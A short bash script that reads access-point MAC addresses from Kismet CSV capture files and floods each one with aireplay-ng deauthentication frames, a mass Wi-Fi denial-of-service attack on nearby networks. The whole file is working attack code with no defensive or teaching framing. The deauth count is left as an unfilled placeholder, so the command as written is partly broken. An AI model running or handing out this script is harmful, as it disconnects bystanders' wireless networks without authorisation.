#!/bin/bash
#Creator: David Parra-Sandoval
#Date: 4/25/2020
#Last Modified Date: 4/25/2020
clear

if [[ ${UID} -ne 0 ]]; then
echo "First run MASSDeauthAllchv2.sh Script"
exit 1
fi

wlan0=$(ip a | grep wl | head -1 | cut -d ":" -f 2)
sleep .5
for MAC in $(cat *.kismet.csv | awk -F ";" '{print $4}' | tail -n 22); do
sudo aireplay-ng --deauth COUNT -a $MAC $wlan0
done
